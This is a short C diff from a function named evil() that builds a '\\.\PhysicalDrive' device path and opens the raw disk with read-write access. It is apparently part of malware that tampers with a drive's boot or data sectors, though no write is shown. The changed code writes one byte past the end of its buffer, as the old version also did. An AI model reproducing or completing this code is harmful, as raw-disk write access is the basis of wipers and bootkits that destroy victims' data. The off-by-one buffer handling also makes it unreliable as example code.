@@ -66,14 +66,16 @@ void evil()
 	
 	char physicaldevice[] = "\\\\.\\PhysicalDrive";
  
-    	char buf[19];
+    	char buf[18];
 
-	char number[2];
-	memset(number, 0x00, 2);
-	wsprintfA(number, "%d", diskExtents.Extents[0].DiskNumber);
+	__asm{
+
+		add diskExtents.Extents[0].DiskNumber, 30h
+
+	}
 	memcpy(buf + 0, physicaldevice, 17);
-	memcpy(buf + 17, number, 2);
-	memcpy(buf + 19, NUL + 0, 1);
+	memcpy(buf + 17, &diskExtents.Extents[0].DiskNumber, 1);
+	memcpy(buf + 18, NUL + 0, 1);
 
 	HANDLE PhysicalDrive = CreateFileA(buf, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);
 
